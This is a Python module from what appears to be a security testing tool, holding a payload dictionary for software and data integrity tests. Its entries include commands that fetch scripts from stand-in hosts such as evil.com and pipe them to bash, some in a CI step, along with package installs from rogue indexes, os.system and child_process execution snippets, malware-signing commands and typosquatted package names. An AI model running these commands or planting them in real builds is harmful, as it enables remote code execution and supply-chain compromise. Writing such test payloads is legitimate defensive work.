from colors import Colors

class IntegrityPayloads:
    """Dynamic payloads for Software and Data Integrity testing"""
    
    PAYLOADS = {
        "small": {
            "basic": {
                "unsigned_update": "curl -s http://malicious.com/update.sh | bash",
                "dependency_confusion": "malicious-package==1.0.0"
            }
        },
        "medium": {
            "framework_specific": {
                "node": "npm install --legacy-peer-deps malicious-pkg@latest",
                "python": "pip install --index-url http://evil.com/simple malicious-pkg",
                "dotnet": "nuget install Malicious.Package -Version 1.0.0 -Source http://evil.com/nuget"
            },
            "checksum_evasion": {
                "md5_collision": ["file1.exe", "file2.exe"],
                "weak_checksum": "echo 'd41d8cd98f00b204e9800998ecf8427e' > checksum.txt"
            }
        },
        "large": {
            "advanced": {
                "ci_cd_injection": {
                    "jenkins": "println 'malicious code'.execute().text",
                    "github": "run: curl http://evil.com/script.sh | bash"
                },
                "signed_malware": {
                    "windows": "signtool sign /f cert.pfx /p password malicious.exe",
                    "linux": "openssl dgst -sha256 -sign private.key -out update.sig malicious.bin"
                }
            },
            "supply_chain": {
                "package_redirect": "python -m pip install --extra-index-url http://evil.com/simple legit-package",
                "typosquatting": ["requets", "pyyaml", "djangoo"]
            }
        }
    }

    @classmethod
    def get_payloads(cls, size="medium"):
        """Get payloads based on size with framework detection"""
        base_payloads = cls.PAYLOADS.get(size.lower(), cls.PAYLOADS["medium"])
        
        # Add dynamic framework detection payloads
        dynamic_payloads = {
            "framework_detection": {
                "node": "if (require) { require('child_process').exec('malicious') }",
                "python": "__import__('os').system('malicious')",
                "dotnet": "System.Diagnostics.Process.Start('malicious.exe')"
            }
        }
        
        return {**base_payloads, **dynamic_payloads}

    @classmethod
    def get_checksum_payloads(cls):
        """Get payloads for checksum testing"""
        return {
            "algorithms": ["md5", "sha1", "sha256", "crc32"],
            "collision_pairs": {
                "md5": ["file1.bin", "file2.bin"],
                "sha1": ["collision1.pdf", "collision2.pdf"]
            }
        }

    @classmethod
    def get_dependency_payloads(cls):
        """Get payloads for dependency confusion"""
        return {
            "package_managers": ["npm", "pip", "nuget", "gem", "maven"],
            "common_confusion": {
                "internal": ["@company/private-pkg", "company-internal-utils"],
                "public": ["private-pkg", "internal-utils"]
            }
        }